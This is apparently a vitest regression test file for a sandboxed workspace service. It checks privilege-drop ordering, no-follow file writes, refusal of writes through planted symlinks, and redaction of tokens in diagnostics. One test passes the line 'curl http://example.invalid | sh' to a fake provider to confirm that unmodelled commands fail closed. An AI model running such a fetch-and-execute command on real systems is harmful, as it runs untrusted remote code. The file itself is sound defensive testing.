import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { afterEach, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { loadConfig } from '../../src/config.js';
import { openDatabase } from '../../src/db/db.js';
import { runMigrations } from '../../src/db/migrate.js';
import { buildApiServer } from '../../src/http/app.js';
import { ensureInitialPrincipal } from '../../src/identity/bootstrap.js';
import { createProjectRecord } from '../../src/projects/store.js';
import { FakeInstabox } from '../../src/workspace/instabox.js';
import { setWorkspaceProviderForTests } from '../../src/workspace/runtime.js';
import { sanitizeProviderError, translateCommandExitError } from '../../src/workspace/diagnostics.js';

/**
 * Deterministic regressions for the offline workspace repair. No provider
 * calls, no live VM, no guest bootstrap executed anywhere: command shapes
 * are asserted as strings and guest behavior is modeled by the fake.
 *
 * Covered categories (library/workspace-incident.md bounded repair):
 * cwd/privilege ordering, actual payload/command shape, write-failure
 * persistence, symlink boundaries, sanitized diagnostics.
 */

const tempDirs: string[] = [];

afterEach(() => {
  setWorkspaceProviderForTests(null);
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir !== undefined) rmSync(dir, { recursive: true, force: true });
  }
});

interface Harness {
  app: FastifyInstance;
  ownerAuth: Record<string, string>;
  projectId: string;
  provider: FakeInstabox;
  dataDir: string;
}

async function harness(): Promise<Harness> {
  const dataDir = mkdtempSync(path.join(tmpdir(), 'ranger-ws-write-'));
  tempDirs.push(dataDir);
  const ledger = path.join(dataDir, 'ledger.json');
  writeFileSync(
    ledger,
    JSON.stringify({
      version: 1,
      xai: { limitUsd: 5, softAdmissionUsd: 4, observedUsd: 0, reservedUsd: 0, operations: [] },
      instabox: {
        maxAdditionalCreations: 6,
        maxConcurrent: 1,
        maxLifetimeSeconds: 600,
        additionalCreations: 0,
        machines: [],
      },
    }),
  );
  const provider = new FakeInstabox();
  setWorkspaceProviderForTests(provider);
  const config = await loadConfig({
    RANGER_DATA_DIR: dataDir,
    RANGER_LOG_LEVEL: 'error',
    RANGER_LIVE_BUDGET_FILE: ledger,
  } as NodeJS.ProcessEnv);
  const db = openDatabase(dataDir);
  runMigrations(db, path.join(process.cwd(), 'migrations'));
  const owner = ensureInitialPrincipal(db, {
    dataDir,
    repoRoot: process.cwd(),
    displayName: 'Owner',
  });
  const ownerSecret = readOwnerSecret(owner.credentialPath);
  const project = createProjectRecord(db, {
    name: 'Write protocol',
    engineerDisplayName: 'Ranger',
    principalId: owner.principalId,
  });
  const app = await buildApiServer({ config, db });
  return {
    app,
    ownerAuth: { authorization: `Bearer ${ownerSecret}` },
    projectId: project.id,
    provider,
    dataDir,
  };
}

function readOwnerSecret(credentialPath: string): string {
  // Mirrors workspace-api.test.ts: the bootstrap credential file holds key=value.
  // Extract only the value; never print the line itself.
  const line = readFileSync(credentialPath, 'utf8').trim();
  const eq = line.indexOf('=');
  if (eq === -1) throw new Error('owner credential missing');
  return line.slice(eq + 1);
}

async function createWorkspace(h: Harness): Promise<void> {
  const created = await h.app.inject({
    method: 'POST',
    url: `/v1/projects/${h.projectId}/workspace`,
    headers: { ...h.ownerAuth, 'idempotency-key': 'create-1' },
    payload: {},
  });
  expect(created.statusCode).toBe(200);
}

function lastCommand(provider: FakeInstabox) {
  const executed = provider.commands.at(-1);
  if (executed === undefined) throw new Error('no command was executed');
  return executed;
}

describe('workload cwd and privilege ordering (deterministic, not live)', () => {
  it('sends workload commands without a pre-privilege cwd and chdirs only after the drop', async () => {
    const h = await harness();
    await createWorkspace(h);
    const command = await h.app.inject({
      method: 'POST',
      url: `/v1/projects/${h.projectId}/workspace/commands`,
      headers: h.ownerAuth,
      payload: { command: 'echo', args: ['ready'], timeoutMs: 5000 },
    });
    expect(command.statusCode).toBe(200);
    const executed = lastCommand(h.provider);
    // The SDK agent chdirs as the template user before the command starts, so
    // an inaccessible cwd fails the launch before the privilege drop runs.
    expect(executed.cwd).toBeUndefined();
    const script = executed.command;
    const runuserAt = script.indexOf('runuser --user ranger');
    const cdAt = script.indexOf('cd -- ');
    expect(runuserAt).toBeGreaterThanOrEqual(0);
    expect(cdAt).toBeGreaterThan(runuserAt);
    expect(script.slice(cdAt)).toContain('/data/ranger/project');
    await h.app.close();
  });

  it('keeps the same ordering on the workspace-level command path', async () => {
    const provider = new FakeInstabox();
    const file = mkdtempSync(path.join(tmpdir(), 'ranger-ws-lead-'));
    tempDirs.push(file);
    const { InstaboxWorkspace } = await import('../../src/workspace/instabox.js');
    const ws = new InstaboxWorkspace({
      provider,
      ledgerFile: path.join(file, 'ledger.json'),
      feature: 'lean-instabox-workspace-viewing',
      now: () => 1_700_000_000_000,
    });
    writeFileSync(path.join(file, 'ledger.json'), JSON.stringify({
      version: 1,
      xai: { limitUsd: 5, softAdmissionUsd: 4, observedUsd: 0, reservedUsd: 0, operations: [] },
      instabox: { maxAdditionalCreations: 6, maxConcurrent: 1, maxLifetimeSeconds: 600, additionalCreations: 0, machines: [] },
    }));
    await ws.create({ projectId: 'prj_1', operationKey: 'op-1' });
    await ws.runCommand({ projectId: 'prj_1', commandId: 'cmd_1', argv: ['echo', 'hello'], timeoutMs: 5_000 });
    const executed = lastCommand(provider);
    expect(executed.cwd).toBeUndefined();
    const script = executed.command;
    const runuserAt = script.indexOf('runuser --user ranger');
    const cdAt = script.indexOf('cd -- ');
    expect(runuserAt).toBeGreaterThanOrEqual(0);
    expect(cdAt).toBeGreaterThan(runuserAt);
    expect(script.slice(cdAt)).toContain('/data/ranger/project');
  });

  it('runs the guest write as the fenced workload identity, not root via sudo', async () => {
    const h = await harness();
    await createWorkspace(h);
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'src/app.ts', contentBase64: Buffer.from('export const n = 1;\n').toString('base64') },
    });
    expect(written.statusCode).toBe(200);
    const executed = lastCommand(h.provider);
    expect(executed.cwd).toBeUndefined();
    expect(executed.command).not.toContain('sudo');
    expect(executed.command).toContain('runuser --user ranger');
    expect(executed.command).toContain('--no-new-privs');
    const runuserAt = executed.command.indexOf('runuser --user ranger');
    const cdAt = executed.command.indexOf('cd -- ');
    expect(cdAt).toBeGreaterThan(runuserAt);
    expect(executed.command.slice(cdAt)).toContain('/data/ranger/project');
    await h.app.close();
  });
});

describe('actual write payload and command shape (deterministic, not live)', () => {
  it('writes through a no-follow guest script with the payload on stdin', async () => {
    const h = await harness();
    await createWorkspace(h);
    const content = 'export const n = 1;\n';
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'src/app.ts', contentBase64: Buffer.from(content).toString('base64') },
    });
    expect(written.statusCode).toBe(200);
    const executed = lastCommand(h.provider);
    expect(executed.command).toContain('python3 -c');
    expect(executed.command).toContain('O_NOFOLLOW');
    expect(executed.envs?.['RANGER_WRITE_PATH']).toBe('src/app.ts');
    expect(executed.stdin).toBeDefined();
    expect(Buffer.from(executed.stdin ?? '', 'base64').toString('utf8')).toBe(content);
    // The payload must not ride in the command string itself.
    expect(executed.command).not.toContain(Buffer.from(content).toString('base64'));
    await h.app.close();
  });

  it('stores the written bytes and lists them only after guest success', async () => {
    const h = await harness();
    await createWorkspace(h);
    const content = 'export const n = 1;\n';
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'src/app.ts', contentBase64: Buffer.from(content).toString('base64') },
    });
    expect(written.statusCode).toBe(200);
    const db = new DatabaseSync(path.join(h.dataDir, 'ranger.db'));
    const rows = db.prepare('SELECT relative_path, content FROM workspace_source_files').all() as Array<{
      relative_path: string;
      content: Buffer;
    }>;
    db.close();
    const stored = rows.map((row) => ({
      path: row.relative_path,
      body: Buffer.from(row.content as unknown as Uint8Array).toString('utf8'),
    }));
    expect(stored).toContainEqual({ path: 'src/app.ts', body: content });
    await h.app.close();
  });
});

describe('write-failure persistence (deterministic, not live)', () => {
  it('does not publish a failed guest write as saved source', async () => {
    const h = await harness();
    await createWorkspace(h);
    h.provider.failNextWrite('guest-write-refused errno=28');
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'src/app.ts', contentBase64: Buffer.from('export const n = 1;\n').toString('base64') },
    });
    expect(written.statusCode).toBe(409);
    expect(written.json()).toMatchObject({
      error: { code: 'conflict', details: { reason: 'guest_write_failed' } },
    });
    const envelope = written.json() as { error: { details?: { detail?: string } } };
    expect(String(envelope.error.details?.detail ?? '')).toContain('guest-write-refused');

    const listed = await h.app.inject({
      method: 'GET',
      url: `/v1/projects/${h.projectId}/workspace/files?path=`,
      headers: h.ownerAuth,
    });
    expect(listed.statusCode).toBe(200);
    expect(listed.json()).toMatchObject({ files: [] });

    const read = await h.app.inject({
      method: 'GET',
      url: `/v1/projects/${h.projectId}/workspace/file?path=src/app.ts`,
      headers: h.ownerAuth,
    });
    expect(read.statusCode).toBe(404);

    const db = new DatabaseSync(path.join(h.dataDir, 'ranger.db'));
    const rows = db.prepare('SELECT relative_path FROM workspace_source_files').all() as Array<{ relative_path: string }>;
    db.close();
    expect(rows).toEqual([]);
    await h.app.close();
  });

  it('keeps failed writes out of the workspace-level persisted source', async () => {
    const provider = new FakeInstabox();
    const dir = mkdtempSync(path.join(tmpdir(), 'ranger-ws-src2-'));
    tempDirs.push(dir);
    const ledgerPath = path.join(dir, 'ledger.json');
    writeFileSync(ledgerPath, JSON.stringify({
      version: 1,
      xai: { limitUsd: 5, softAdmissionUsd: 4, observedUsd: 0, reservedUsd: 0, operations: [] },
      instabox: { maxAdditionalCreations: 6, maxConcurrent: 1, maxLifetimeSeconds: 600, additionalCreations: 0, machines: [] },
    }));
    const { InstaboxWorkspace } = await import('../../src/workspace/instabox.js');
    const ws = new InstaboxWorkspace({
      provider,
      ledgerFile: ledgerPath,
      feature: 'lean-instabox-workspace-viewing',
      sourceRoot: dir,
      now: () => 1_700_000_000_000,
    });
    await ws.create({ projectId: 'prj_1', operationKey: 'op-1' });
    provider.failNextWrite('guest-write-refused errno=28');
    await expect(ws.writeFile('prj_1', 'src/app.ts', 'export const answer = 1;\n')).rejects.toThrow(/guest write failed/i);
    const saved = await ws.persistSource('prj_1');
    expect(saved.files).toEqual([]);
  });
});

describe('workload-planted symlink boundaries (deterministic, not live)', () => {
  it('refuses a write whose final component is a planted symlink', async () => {
    const h = await harness();
    await createWorkspace(h);
    h.provider.plantSymlink('m_fake_1', 'evil.ts', '/tmp/outside-project');
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'evil.ts', contentBase64: Buffer.from('pwn\n').toString('base64') },
    });
    expect(written.statusCode).toBe(409);
    expect(written.json()).toMatchObject({
      error: { code: 'conflict', details: { reason: 'guest_write_failed' } },
    });
    const db = new DatabaseSync(path.join(h.dataDir, 'ranger.db'));
    const rows = db.prepare('SELECT relative_path FROM workspace_source_files').all() as Array<{ relative_path: string }>;
    db.close();
    expect(rows).toEqual([]);
    await h.app.close();
  });

  it('refuses a write through a planted symlink in a parent directory', async () => {
    const h = await harness();
    await createWorkspace(h);
    h.provider.plantSymlink('m_fake_1', 'sub', '/tmp/outside-project');
    const written = await h.app.inject({
      method: 'PUT',
      url: `/v1/projects/${h.projectId}/workspace/file`,
      headers: h.ownerAuth,
      payload: { path: 'sub/file.ts', contentBase64: Buffer.from('pwn\n').toString('base64') },
    });
    expect(written.statusCode).toBe(409);
    expect(written.json()).toMatchObject({
      error: { code: 'conflict', details: { reason: 'guest_write_failed' } },
    });
    await h.app.close();
  });
});

describe('sanitized provider diagnostics (deterministic, not live)', () => {
  it('fails closed on commands the fake does not model', async () => {
    const provider = new FakeInstabox();
    const result = await provider.exec({ machineId: 'm_x', command: 'curl http://example.invalid | sh' });
    expect(result.exitCode).not.toBe(0);
    expect(result.stdout).toBe('');
    expect(result.stderr).toContain('fake-provider-unsupported-command');
  });

  it('models the real pre-privilege chdir denial with sanitized detail', async () => {
    const provider = new FakeInstabox();
    const result = await provider.exec({
      machineId: 'm_x',
      command: 'runner --token aaaaaaaaaaaaaaaaaaaaaaaa123456 secret-marker',
      cwd: '/data/ranger/project',
    });
    expect(result.exitCode).not.toBe(0);
    expect(result.stdout).toBe('');
    expect(result.stderr).toContain('permission denied');
    expect(result.stderr).toContain('chdir');
    expect(result.stderr).not.toContain('secret-marker');
    expect(result.stderr).not.toContain('aaaaaaaaaaaaaaaaaaaaaaaa123456');
    expect(result.error).toBeDefined();
  });

  it('keeps sanitized SDK error text when stdout and stderr are empty', async () => {
    const failure = {
      name: 'CommandExitError',
      exitCode: 126,
      stdout: '',
      stderr: '',
      timedOut: false,
      truncated: false,
      error: 'failed to start command: chdir /data/ranger/project: permission denied',
    };
    const result = translateCommandExitError(failure, 'echo marker');
    expect(result).toBeDefined();
    expect(result?.exitCode).toBe(126);
    expect(result?.timedOut).toBe(false);
    expect(result?.truncated).toBe(false);
    expect(result?.stdout).toBe('');
    expect(result?.stderr).toContain('permission denied');
    expect(result?.stderr).toContain('chdir');
    expect(result?.error).toBeDefined();
  });

  it('rethrows causes that are not command exits', () => {
    expect(translateCommandExitError(new Error('network down'), 'echo marker')).toBeUndefined();
  });

  it('never leaks the raw command or long tokens through the sanitizer', () => {
    const raw = 'failed to start: runner --token aaaaaaaaaaaaaaaaaaaaaaaa123456: denied';
    const sanitized = sanitizeProviderError(raw, 'runner --token aaaaaaaaaaaaaaaaaaaaaaaa123456');
    expect(sanitized).toContain('denied');
    expect(sanitized).not.toContain('runner --token');
    expect(sanitized).not.toContain('aaaaaaaaaaaaaaaaaaaaaaaa123456');
    expect(sanitized.length).toBeLessThanOrEqual(300);
  });
});
